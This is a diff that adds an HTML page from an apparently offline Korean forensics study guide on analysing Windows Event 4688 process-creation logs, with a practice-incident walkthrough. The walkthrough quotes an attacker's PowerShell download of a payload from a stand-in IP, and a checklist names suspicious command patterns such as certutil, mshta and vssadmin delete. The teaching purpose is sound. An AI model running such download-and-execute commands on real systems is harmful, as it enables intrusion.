+<div class="table-wrap"><table><thead><tr><th>항목</th><th>Security 4688</th><th>Sysmon Event 1</th></tr></thead><tbody><tr><td>활성 조건</td><td>감사 정책 필요</td><td>Sysmon 설치 + 구성 필요</td></tr><tr><td>명령행</td><td><strong>별도 정책이 켜져야 함</strong></td><td>항상 <code>CommandLine</code> 으로 제공</td></tr><tr><td>부모 경로</td><td><code>ParentProcessName</code> (Win10+)</td><td>항상 <code>ParentImage</code></td></tr><tr><td>부모 명령행</td><td>없음</td><td><strong><code>ParentCommandLine</code> 제공</strong></td></tr><tr><td>실행 파일 해시</td><td>없음</td><td><strong><code>Hashes</code> (MD5/SHA256 등, 구성에 따름)</strong></td></tr><tr><td>서명/제품 정보</td><td>없음</td><td><code>Company</code>, <code>Product</code>, <code>OriginalFileName</code></td></tr><tr><td>작업 디렉터리</td><td>없음</td><td><code>CurrentDirectory</code></td></tr><tr><td>프로세스 식별자</td><td>PID(16진수). 재사용 문제 있음</td><td><strong><code>ProcessGuid</code>로 재사용 문제 없음</strong></td></tr><tr><td>무결성 수준</td><td><code>MandatoryLabel</code> (SID)</td><td><code>IntegrityLevel</code> (문자열)</td></tr><tr><td>세션 연결</td><td><code>SubjectLogonId</code></td><td><code>LogonId</code>, <code>LogonGuid</code></td></tr><tr><td>채널</td><td><code>Security</code></td><td><code>Microsoft-Windows-Sysmon/Operational</code></td></tr><tr><td>노이즈</td><td>매우 많음</td><td>구성 파일로 필터 가능</td></tr></tbody></table></div>
+<p>핵심 차이는 <strong>해시 · 부모 명령행 · ProcessGuid</strong> 세 가지다. 4688 만 있을 때는 이 셋을 다른 artifact 로 메워야 한다(해시는 파일 자체에서, 부모 명령행은 부모의 4688 에서, PID 재사용은 시각 창으로).</p>
+<h2 id="mini-walkthrough">mini walkthrough</h2>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button" data-copy>복사</button><pre><code class="lang-text">문제:
+&quot;2026-03-14 침해 사고입니다. 공격자가 내려받은 페이로드의 URL 을 구하세요.
+ 첨부: Security.evtx (61,904 events)&quot;
+
+1. 첫 시도 (실패):
+   Get-WinEvent ... Id=4688 | Where-Object { $_.Message -match &#39;http&#39; }
+   -&gt; 0건.
+   &quot;다운로드가 없었다&quot;고 결론 낼 뻔했다.
+
+2. 왜 틀렸나:
+   4688 을 한 건 열어 보니 CommandLine 필드 자체가 없었다.
+   즉 &#39;Include command line in process creation events&#39; 정책이 꺼진 상태.
+   경로만 남고 인자는 기록되지 않았다.
+   -&gt; 4688 의 CommandLine 으로 URL 을 찾는 접근은 이 이미지에서 성립하지 않는다.
+
+3. 방향 전환 — 경로만으로 무엇이 실행됐는지 본다:
+   Import-Csv 4688.csv | Where-Object { $_.User -notmatch &#39;\$$&#39; } |
+     Group-Object NewProc | Sort-Object Count | Select-Object Count, Name
+
+   Count  Name
+   ...
+   3      C:\Windows\System32\certutil.exe
+   2      C:\Windows\System32\mshta.exe
+   1      C:\Users\jhkim\AppData\Local\Temp\svc_update.exe
+
+   certutil 과 mshta 가 사용자 세션에서 실행됐다. 정상 워크스테이션 사용 패턴이 아니다.
+
+4. 체인 재구성 (PID):
+   certutil 의 4688: NewProcessId=0x1274, ProcessId=0x9ac
+   NewProcessId=0x9ac 인 4688 -&gt; C:\Windows\System32\cmd.exe (ProcessId=0x5f8)
+   NewProcessId=0x5f8 인 4688 -&gt; C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+
+   WINWORD -&gt; cmd -&gt; certutil.
+   문서 매크로가 출발점이라는 것이 확정됐다.
+
+5. URL 은 어디서? -&gt; 명령행이 없는 구간을 다른 로그로 메운다:
+   같은 시각대의 PowerShell Operational 4104 를 열었다.
+   -&gt; Invoke-WebRequest -Uri &#39;http://198.51.100.5/u/pl.dat&#39; -OutFile &quot;$env:TEMP\svc_update.exe&quot;
+
+6. 교차검증:
+   4688 의 Temp\svc_update.exe 실행 시각 = 07:24:55Z
+   4104 의 다운로드 시각        = 07:24:31Z
+   -&gt; 24초 차이. 다운로드 직후 실행. 일치.
+
+7. 시간대 확정:
+   EVTX SystemTime 은 UTC. 07:24:31Z -&gt; KST 16:24:31.
+   문제에서 KST 를 요구하면 +9 를 적용해 답한다.
+
+정답: http://198.51.100.5/u/pl.dat</code></pre></div>
+<p>1단계의 실패가 이 글의 핵심이다. <strong>4688 에서 명령행이 안 나오는 것은 &quot;없었다&quot;가 아니라 &quot;기록되지 않았다&quot;</strong> 이고, 그때는 (a) 경로와 부모 체인으로 무엇이 실행됐는지를 세우고 (b) 인자는 4104·Sysmon 1·Prefetch·브라우저 흔적으로 메운다.</p>
+<h2 id="막혔을-때-다음-체크">막혔을 때 다음 체크</h2>
+<ol><li><code>CommandLine</code> 필드가 존재하는지 원본 XML 을 한 건 열어 확인했는가 — 여기서 전략이 갈린다</li><li><code>ProcessId</code> 를 부모로, <code>NewProcessId</code> 를 자식으로 올바르게 읽었는가</li><li>16진수 PID 를 십진수로 변환해 비교했는가</li><li>부모 체인을 루트(<code>explorer.exe</code> / <code>services.exe</code> / Office 앱)까지 올라갔는가</li><li><code>TokenElevationType</code> = <code>%%1937</code> 인 레코드를 따로 뽑았는가</li><li><code>NewProcessName</code> 경로가 <code>\Temp\</code> · <code>\AppData\</code> · <code>\ProgramData\</code> · <code>\Users\Public\</code> 인 건을 훑었는가</li><li>의심 명령행 정규식(<code>-enc</code>, <code>certutil</code>, <code>mshta</code>, <code>rundll32 javascript:</code>, <code>vssadmin delete</code>)을 전부 돌렸는가</li><li>4688 이 비어 있다면 → Sysmon 1, PowerShell 4104/4103, Prefetch, Amcache 로 대체</li><li>4688 구간이 뚝 끊겼다면 → 1102(로그 삭제), 4719(감사 정책 변경), 로그 최대 크기 초과 롤오버 확인</li><li>답을 UTC 로 낼지 KST(+9)로 낼지 지문을 다시 읽었는가</li></ol>
+<h2 id="출처">출처</h2>
+<ul><li>SRC-021 — Microsoft Learn, Event 4688 (A new process has been created): EventData 필드 정의, <code>TokenElevationType</code> 의 <code>%%1936</code>/<code>%%1937</code>/<code>%%1938</code> 대응, <code>ProcessId</code> 가 부모 PID 라는 점</li><li>SRC-022 — Microsoft Learn, Advanced security audit policy settings: <code>Audit Process Creation</code> 하위 범주와 4688/4689 의 활성 조건</li><li>SRC-086 — MITRE ATT&amp;CK Enterprise Techniques: LOLBin 프록시 실행·정찰·지속성·섀도 복사본 삭제 등 의심 명령행 패턴의 근거</li><li><code>ProcessCreationIncludeCmdLine_Enabled</code> 값 이름과 그룹 정책 메뉴 경로는 Windows 버전에 따라 표기가 다를 수 있으므로 실제 시스템에서 확인할 것</li><li>Sysmon Event 1 의 필드 구성은 Sysmon 버전과 구성 파일에 따라 달라진다. 해시 알고리즘은 구성의 <code>HashAlgorithms</code> 설정에 의존하므로 실제 이벤트에서 확인할 것</li></ul>
+<p>&lt;/content&gt; &lt;/invoke&gt;</p>
+      </div>
+      <section class="related">
+  <h2>관련 글</h2>
+  <div class="related-grid">
+  <a class="related-item" href="./event-4624-logon.html">
+    <span class="rel-id">FOR-0083 · Event Log</span>
+    Event ID 4624 성공 로그온 분석: 누가 어디서 어떻게 들어왔나
+  </a>
+  <a class="related-item" href="./powershell-4104-scriptblock.html">
+    <span class="rel-id">FOR-0097 · Event Log</span>
+    PowerShell 4104 ScriptBlock 로깅: 쪼개진 스크립트 재조립과 난독화 해제
+  </a>
+  <a class="related-item" href="./sysmon-event-1-process-create.html">
+    <span class="rel-id">FOR-0099 · Event Log</span>
+    Sysmon Event ID 1 ProcessCreate: ProcessGuid로 프로세스 계보 복원
+  </a>
+  <a class="related-item" href="./pid-processname-pivot.html">
+    <span class="rel-id">FOR-0105 · Event Log</span>
+    PID·ProcessName으로 pivot하기: 16진수 함정과 프로세스 계보 재구성
+  </a>
+  </div>
+</section>
+      <div class="pager">
+<a class="related-item" href="./event-4672-special-privileges.html"><span class="rel-id">← FOR-0087</span>Event ID 4672 특수 권한 로그온: PrivilegeList로 관리자 세션을 확정한다</a>
+<a class="related-item" href="./event-4697-service-install.html"><span class="rel-id">FOR-0089 →</span>Event ID 4697 서비스 설치 감사: 누가 서비스를 등록했는지까지 남는다</a>
+      </div>
+    </article>
+<aside class="toc">
+  <div class="toc-title">목차</div>
+  <ul>
+<li class="toc-l2"><a href="#한-줄-결론">한 줄 결론</a></li>
+<li class="toc-l2"><a href="#어떤-문제에서-필요한가">어떤 문제에서 필요한가</a></li>
+<li class="toc-l2"><a href="#문제에서-처음-볼-단서">문제에서 처음 볼 단서</a></li>
+<li class="toc-l2"><a href="#30초-절차">30초 절차</a></li>
+<li class="toc-l2"><a href="#상세-절차">상세 절차</a></li>
+<li class="toc-l3"><a href="#1단계-commandline-이-기록되는-조건을-먼저-확정한다">1단계 — CommandLine 이 기록되는 조건을 먼저 확정한다</a></li>
+<li class="toc-l3"><a href="#2단계-노이즈를-경로로-잘라낸다">2단계 — 노이즈를 경로로 잘라낸다</a></li>
+<li class="toc-l3"><a href="#3단계-정상-부모-자식-기준선과-대조한다">3단계 — 정상 부모-자식 기준선과 대조한다</a></li>
+<li class="toc-l3"><a href="#4단계-pid-로-체인을-잇는다">4단계 — PID 로 체인을 잇는다</a></li>
+<li class="toc-l3"><a href="#5단계-의심-명령행-패턴을-정규식으로-긁는다">5단계 — 의심 명령행 패턴을 정규식으로 긁는다</a></li>
+<li class="toc-l2"><a href="#출력-필드-해석">출력 필드 해석</a></li>
+<li class="toc-l3"><a href="#tokenelevationtype">TokenElevationType</a></li>
+<li class="toc-l3"><a href="#mandatorylabel-무결성-수준">MandatoryLabel (무결성 수준)</a></li>
+<li class="toc-l3"><a href="#원본-xml-예시">원본 XML 예시</a></li>
+<li class="toc-l2"><a href="#pivot-다음에-볼-artifact">pivot: 다음에 볼 artifact</a></li>
+<li class="toc-l2"><a href="#흔한-함정">흔한 함정</a></li>
+<li class="toc-l2"><a href="#교차검증">교차검증</a></li>
+<li class="toc-l3"><a href="#4688-과-sysmon-event-1-비교">4688 과 Sysmon Event 1 비교</a></li>
+<li class="toc-l2"><a href="#mini-walkthrough">mini walkthrough</a></li>
+<li class="toc-l2"><a href="#막혔을-때-다음-체크">막혔을 때 다음 체크</a></li>
+<li class="toc-l2"><a href="#출처">출처</a></li>
+  </ul>
+</aside>
+  </div>
+</main>
+<footer class="site-footer">
+  완전 오프라인 · 인터넷/CDN 없음 · build 2026-09-10 08:40 KST
+</footer>
+<script src="../assets/search-index.js"></script>
+<script src="../assets/search-core.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
